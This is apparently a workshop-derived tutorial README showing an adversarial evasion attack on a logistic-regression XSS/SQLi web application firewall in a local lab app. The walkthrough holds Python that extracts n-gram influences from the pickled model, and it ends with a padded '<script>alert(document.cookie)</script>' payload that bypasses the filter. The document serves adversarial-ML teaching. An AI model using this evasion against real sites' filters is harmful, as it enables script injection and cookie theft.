# XSS-WAF

The code was adopted from DEFCON26 AIVillage from the Hacking Thingz Powered By Machine Learning
workshop lead by Clarence Chio and Anto Joseph. 


The WAF uses a logistic regression classifier to detect cross-site scripting (XSS) and 
SQLi attacks, and it serves as a meaningful example to consider how adversarial attacks
on our machine learning models have real world implications. Here I will show how to 
disect the machine learning algorithm to find the n-gram that influences the model to make
a benign classification, and then we will use that n-gram in an evasion attack to force
the classifier to make a false negative prediction.

To get started we will first look at the web app and give it some benign and malicious input
to see how it is making decisions. Run the `/vuln/main.py` file and go to `http://localhost:5000`
and we can enter search queries in the search box as shown below. After we enter a normal query 
of something like `/api/v1.0/storeAPI/water?` we see in the terminal window that the classifier 
detects it as non-malicious input. Similarly when we enter some script tags, the classifier makes 
the correct decision labeling it malicious.

<img width="1436" alt="test" src="https://user-images.githubusercontent.com/32188816/51010915-903d2900-1513-11e9-8a52-1574dcd1070c.png">

So the goal is to evade the classifier to make it think `<script>alert(document.cookie)</script>` 
is a non-malicious input. For this attack we assume that the attacker has hold of the serialized 
object of the trained model. This is the `/waf/trained_waf_model` object. Using the other terminal 
window we begin to disect this serialized object using a Python shell. Using the following script 
allows us to find the classifier's term influences, sort them, and find the n-gram that aids the 
model in making benign classifications.

```python
>>> import pickle
>>> model = pickle.load(open('trained_waf_model', 'rb'))
>>> vars(model)
{'steps': [('vectorizer', TfidfVectorizer(analyzer='char', binary=False, decode_error='strict',
        dtype=<class 'numpy.int64'>, encoding='utf-8', input='content',
        lowercase=True, max_df=1.0, max_features=None, min_df=0.0,
        ngram_range=(1, 3), norm='l2', preprocessor=None, smooth_idf=True,
        stop_words=None, strip_accents=None, sublinear_tf=True,
        token_pattern='(?u)\\b\\w\\w+\\b', tokenizer=None, use_idf=True,
        vocabulary=None)), ('classifier', LogisticRegression(C=1.0, class_weight='balanced', dual=False,
          fit_intercept=True, intercept_scaling=1, max_iter=100,
          multi_class='ovr', n_jobs=1, penalty='l2', random_state=None,
          solver='liblinear', tol=0.0001, verbose=0, warm_start=False))], 'memory': None}
```

Using the built-in `vars()` function we can see that our serialized object has two steps. The first is
a tf_idf vectorizor and the second is the logistic regression classifier. We can assign these objects as 
follows.

```python        
>>> vec = model.steps[0][1]
>>> clf = model.steps[1][1]
>>> vec
TfidfVectorizer(analyzer='char', binary=False, decode_error='strict',
        dtype=<class 'numpy.int64'>, encoding='utf-8', input='content',
        lowercase=True, max_df=1.0, max_features=None, min_df=0.0,
        ngram_range=(1, 3), norm='l2', preprocessor=None, smooth_idf=True,
        stop_words=None, strip_accents=None, sublinear_tf=True,
        token_pattern='(?u)\\b\\w\\w+\\b', tokenizer=None, use_idf=True,
        vocabulary=None)
        
>>> clf
LogisticRegression(C=1.0, class_weight='balanced', dual=False,
          fit_intercept=True, intercept_scaling=1, max_iter=100,
          multi_class='ovr', n_jobs=1, penalty='l2', random_state=None,
          solver='liblinear', tol=0.0001, verbose=0, warm_start=False)
```

Here it is important to note that we can observe some valuable information as attackers that will help in 
finding the most influential benign n-gram. First is that we will have n-grams in the range (1, 3), and second
is that we see `use_idf=True` which tells us that this vectorizor has a learned inverse document frequency 
vector that is stored in its `.idf_` attribute. Using that information with what we know about logistic regression
classifiers, we can find the term influences by multiplying the learned idf's with the classifiers weights stored in
`clf.coef_`.

```python 
>>> vec.idf_
array([ 9.87141382, 13.29459011, 13.98773729, ..., 14.3932024 ,
       14.3932024 , 14.3932024 ])
       
>>> clf.coef_
array([[4.19733220e+00, 3.19953188e-02, 1.53663421e-03, ...,
        6.55565066e-06, 6.55565066e-06, 6.55565066e-06]])
        
>>> term_influences = vec.idf_ * clf.coef_
>>> term_influences
array([[4.14336030e+01, 4.25364648e-01, 2.14940357e-02, ...,
        9.43568068e-05, 9.43568068e-05, 9.43568068e-05]])
```

Now that we have the term_influences we need to use that information to find the corresponding n-gram
from our feature matrix. We can partition the `term_influences` into indices for our feature matrix and
sort them using `np.argpartition()` then we know that the smallest index will correspond to the most
benign n-gram.

```python  
>>> import numpy as np
>>> np.argpartition(term_influences, 1)
array([[82524, 92802,     2, ..., 98461, 98462, 98463]])

>>> index = np.argpartition(term_influences, 1)[0][0]
>>> index
82524
```

Now that we have the index of the most benign n-gram, we need to swap the key value pairs in `vec.vocabulary_`
so that we can access the n-gram using the index we just found. Currently the n-grams are the keys and the 
indices are the values, so we simply create a new dictionary copying over the old values as our new keys, and
the old keys as our new values.

```python
>>> dict(list(vec.vocabulary_.items())[0:5])
{'m/j': 66484, 'hwq': 57554, '&xh': 4488, 'v?': 87370, 'i^': 58462}

>>> vocab = dict([(v,k) for k,v in vec.vocabulary_.items()])
>>> term = vocab[index]
>>> term
't/s'
```

Now that we have found our most benign n-gram we can begin to test the classifier against
our desired payload below. First we enter our desired XSS attack string and see the model
classifies it as malicious input as we would expect. Further, using the `predict_proba()`
function we can see the classifiers prediction confidence levels. It starts off really
confident that our payload is malicious, but we see that when we append the benign n-gram
`term` it becomes less confident that the input is malicous, and more confident that the 
input is benign. What's happening here is that we have found the gradient of the classifier's
confidence, and by `term*850` we are ascending that gradient into the direction of our target
class, which is class 0. This is called gradient ascent, and as we see it allowed us to fool
the classifier into thinking that our malicious payload is non-malicious because the benign
prediction probability is greater than 50%.

```python
>>> payload = "<script>alert(document.cookie)</script>"
>>> model.predict([payload])[0]
1

>>> model.predict_proba([payload])[0]
array([1.0021327e-08, 9.9999999e-01])

>>> model.predict_proba([payload + term])[0]
array([1.61162623e-07, 9.99999839e-01])

>>> model.predict_proba([payload + term*850])[0]
array([0.56084963, 0.43915037])

>>> payload + term*850
'<script>alert(document.cookie)</script>t/st/st/st/st/st/st/st/st/st/st/st/st/st
/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st
/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st
/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st
/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st
/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st
/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st
/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st
/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st
/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st
/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st
/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st
/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st
/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st
/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st
/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st
/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st
/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st
/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st
/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st
/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st
/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st
/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st
/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st
/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st
/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st
/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st
/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st
/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st
/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st
/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st
/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/st/s'

```

Finally we print out the payload that evaded the classifier so that we can move back to
the web app and try this attack in our browser. Shown in the image below we entered the
payload string and have verified that it bypassed the WAF and allowed us to inject our
XSS attack string. =D

<img width="1440" alt="evaded" src="https://user-images.githubusercontent.com/32188816/51012298-b4036d80-1519-11e9-8ff3-0e045b086646.png">
